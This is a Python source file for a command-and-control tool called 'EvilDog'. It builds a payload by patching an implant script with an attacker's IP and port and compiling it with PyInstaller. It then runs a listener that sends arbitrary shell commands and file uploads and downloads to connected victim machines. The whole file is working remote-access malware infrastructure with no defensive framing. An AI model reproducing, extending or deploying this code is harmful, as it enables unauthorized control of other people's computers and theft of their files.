import argparse
import subprocess
import os
import socket
import time
import base64
import json

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKRED = '\033[31m'
    OKYELLOW = '\033[33m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

parser = argparse.ArgumentParser()
parser.add_argument(
    "-b",
    "--builder",
    default="none",
    required=False,
    help="use -u to input the start url"
)
class Builder():
    def build_linux():
        opath = input("Output Path / Filename No Extension : ")
        host = input("IP for listner : ")
        port = input("Port for listner : ")
        with open('dog.py' ,'r') as f:
            file = f.read()
            update = file.replace("127.0.0.1",host)
            update = update.replace("4444",port)
        with open(".temp",'w') as f:
            f.write(update)
        print("Value Updated")
        try:
            subprocess.check_output(str("python3 -m PyInstaller --version").split())
        except Exception as e:
            print("Unable to execute PyInstaller as python3 -m PyInstaler --version \n Install It To Compile The File")
        try:
            subprocess.check_output(str(f"python3 -m PyInstaller {os.getcwd()}/.temp --onefile").split(),stderr=subprocess.STDOUT)
            subprocess.check_output(f"mv dist/.temp {opath}".split())
            subprocess.check_output("rm -rf build dist .temp .temp.spec".split())
        except subprocess.CalledProcessError as e:
            output = e.output

class C2c():
    def __init__(self):
        with open('config.json','r') as f:
            settings = json.load(f)
            self.host = settings["Host"]
            self.port = settings["Port"]
            self.version = settings["Version"]
            self.name = settings["Name"]
            self.cmdlist = ['get','put','help']
            self.state = True
    def banner(self,name,version,host,port):
        print(f"{bcolors.OKCYAN}")
        print('''
        
        ⡿⠛⠻⡉⠉⠛⠻⢷⣠⡀⠀⠀⠀⠀⠀⠀⣰⠋⠀⣀⣀⣀⣉⠙⢿⡆⠀⠀⠀⠀
⣿⠀⠀⠈⠢⠀⠀⠀⠈⠛⣦⣀⣀⣀⡤⠞⠛⠋⠉⢁⣤⣛⡁⠀⠀⢻⡄⠀⠀⠀
⣿⠀⠀⠀⠀⢡⣀⠄⠂⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⢉⣉⣓⣾⣷⡀⠀⠀
⢿⡄⠀⠀⢀⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠥⠤⡀⠙⣷⡀⠀
⠈⣷⡀⢀⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⢱⠀⠀⠀⠀⠸⣷⠀
⠀⣸⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡤⠀⠀⠀⠀⠀⠇⢸⠀⠀⠀⠀⠀⢿⡆
⡆⣿⠁⠀⠀⠀⢀⣠⣶⣯⣍⣽⣋⣉⣉⠀⠀⠀⠀⠀⠀⣠⣥⣤⡶⣶⠟⢻⣿⣇
⣿⣿⣿⣷⣶⣶⣾⣿⣿⣿⣿⡿⣹⠏⠙⣿⣷⣄⣠⣤⣾⣿⣿⡿⢰⠇⠀⣾⣿⡇
⠹⣯⠈⠉⠉⠛⢻⣿⣿⣿⡿⢡⡟⠀⣰⣿⣿⠛⠛⠋⠹⣿⣿⠃⡿⠀⢸⣿⣿⣇
⠀⣿⠀⠀⠀⠀⠘⣿⣿⣿⢣⡿⠁⢠⣿⣿⣇⠀⢀⣀⣤⣹⣿⣼⡇⣀⣿⡿⠈⣇
⣼⠏⠀⡠⠔⠒⠊⠈⠛⠿⣿⣧⣤⣿⠿⢿⡄⠀⠘⣿⠿⠃⠈⠙⠛⠉⠁⠀⠀⢸
⣷⣤⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⠤⠔⠛⠒⠂⠀⠀⠀⠀⠀⠀⢀⣽
⠛⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠟⠉
⠀⠀⠉⠻⢶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡴⠟⠉⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠉⢛⡿⠓⠒⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⠄⠀⠀⠀⠀⠀

        ''')
        print(f"{bcolors.ENDC}")
        print(f"{bcolors.HEADER}{name} \t Version : {version}{bcolors.ENDC}")
        print(f"{bcolors.WARNING}={bcolors.ENDC}"*50)
        print(f"{bcolors.OKGREEN}Listening On {host}:{port}{bcolors.ENDC}\n\n")
    def help(self):
        print(f"help  : to show the help menu")
        print(f"put   : to upload a file")
        print(f"get   : to download a file")
        print(f"exit  : to close the program")
    def execman(self,cmd):
        if cmd.split(" ")[0] not in self.cmdlist:
            return cmd.encode()
        if cmd.split(" ")[0] == self.cmdlist[1]:
            with open(cmd.split(" ")[1],'rb') as f:
                f = f.read()
                a = cmd.split(" ")[2]
                return f"put {str(base64.b64encode(f))} {a}".encode()
            
    def printop(self,op):
            try:
                op = op.decode()
                decoded_bytes = base64.b64decode(op)
                return base64.b64encode(decoded_bytes) == op.encode()
            except:
                return op

    def run(self):
            try:
                self.listner = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                self.listner.bind((self.host,self.port))
                self.listner.listen()
                self.banner(self.name,self.version,self.host,self.port)
                print(f"{bcolors.OKRED}Waiting For Connection {bcolors.ENDC}")
                while True:
                    try:
                        c, addr = self.listner.accept() 
                    except KeyboardInterrupt:
                        print("\n Quiting")  
                        exit() # Establish connection with client.
                    print(f"connection from {addr}")
                    a = c.recv(1024).decode()
                    while self.state == True:
                        try:
                            cmd = input(f"{bcolors.BOLD}{bcolors.OKBLUE} EvilDog > {bcolors.ENDC}")
                            c.send(self.execman(cmd))
                            op = c.recv(1024)
                            print(self.printop(op))
                        except KeyboardInterrupt:
                            c.close() 
                            print("\n Quiting")
                            exit()

                                   # Close the connection
            except Exception as e:
                print(e)
                print(f"{bcolors.WARNING}Something is wrong\nQuitting.....{bcolors.ENDC} \n {bcolors.OKRED}{e}{bcolors.ENDC}")
                exit()
if __name__ == "__main__":
    args = parser.parse_args()
    b = args.builder
    if str(b) == 'linux':
        Builder.build_linux()
    else:
        runner = C2c()
        runner.run()
